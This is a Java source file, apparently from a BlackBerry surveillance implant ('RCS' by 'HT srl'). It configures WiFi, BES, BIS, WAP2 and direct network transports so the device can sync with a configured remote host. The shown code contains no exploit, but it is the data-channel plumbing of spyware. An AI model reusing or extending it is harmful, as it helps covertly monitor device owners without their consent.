//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SyncAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action.sync;

import net.rim.device.api.system.DeviceInfo;
import blackberry.Messages;
import blackberry.action.sync.transport.BesTransport;
import blackberry.action.sync.transport.BisTransport;
import blackberry.action.sync.transport.DirectTransport;
import blackberry.action.sync.transport.Wap2Transport;
import blackberry.action.sync.transport.WifiTransport;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class SyncActionInternet extends SyncAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncActionInt", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    protected boolean wifiForced;

    protected boolean wifi;
    protected boolean gprs;
    protected boolean bis;
    protected boolean bes;
    protected boolean wap2;

    String host;

    private boolean stop;

    /**
     * Instantiates a new sync action internet.
     * 
     * @param params
     *            the conf params
     */
    public SyncActionInternet(ConfAction conf) {
        super(conf);
    }

    protected boolean parse(final ConfAction params) {
        try {
            wifi = true;
            gprs = params.getBoolean(Messages.getString("f.1")); //$NON-NLS-1$
            wifi = params.getBoolean(Messages.getString("f.2")); //$NON-NLS-1$
            wifiForced = wifi;
            host = params.getString(Messages.getString("f.3")); //$NON-NLS-1$
            stop = params.getBoolean(Messages.getString("f.4")); //$NON-NLS-1$
        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error(Messages.getString("f.5")); //$NON-NLS-1$
            //#endif
        }

        bis = gprs;
        bes = gprs;
        wap2 = gprs;

        if(DeviceInfo.isSimulator()){
            gprs=true;
            bis=false;
            bes=false;
            wap2=false;
            wifi=false;
        }
        
        //#ifdef DEBUG
        final StringBuffer sb = new StringBuffer();
        sb.append("gprs: " + gprs); //$NON-NLS-1$
        sb.append(" wifi: " + wifi); //$NON-NLS-1$
        sb.append(" stop: " + stop); //$NON-NLS-1$
        sb.append(" host: " + host); //$NON-NLS-1$
        debug.trace(sb.toString());
        //#endif

        return true;
    }

    //#ifdef DEBUG
    public String toString() {
        return "SyncInternet "; //$NON-NLS-1$
    }
    //#endif

    protected boolean initTransport() {
        if (wifi) {
            //#ifdef DEBUG
            debug.trace("initTransport adding WifiTransport"); //$NON-NLS-1$
            //#endif
            transports.addElement(new WifiTransport(host, wifiForced));
        }

        if (bes) {
            //#ifdef DEBUG
            debug.trace("initTransport adding BesTransport"); //$NON-NLS-1$
            //#endif
            transports.addElement(new BesTransport(host));
        }

        if (bis) {
            //#ifdef DEBUG
            debug.trace("initTransport adding BisTransport"); //$NON-NLS-1$
            //#endif
            transports.addElement(new BisTransport(host));
        }

        if (wap2) {
            //#ifdef DEBUG
            debug.trace("initTransport adding Wap2Transport"); //$NON-NLS-1$
            //#endif
            transports.addElement(new Wap2Transport(host));
        }

        if (gprs) {
            //#ifdef DEBUG
            debug.trace("initTransport adding DirectTransport"); //$NON-NLS-1$
            //#endif
            transports.addElement(new DirectTransport(host));
        }

        return true;
    }

}
